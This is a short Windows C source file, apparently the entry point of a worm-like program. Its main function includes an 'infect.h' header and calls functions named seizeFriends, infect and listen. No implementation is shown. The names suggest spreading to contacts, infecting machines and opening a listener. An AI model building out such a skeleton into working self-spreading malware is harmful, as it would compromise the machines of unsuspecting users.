#include <windows.h>
#include "infect.h"


void main(void){

    if (seizeFriends() == 0) infect();
    listen();

}
    
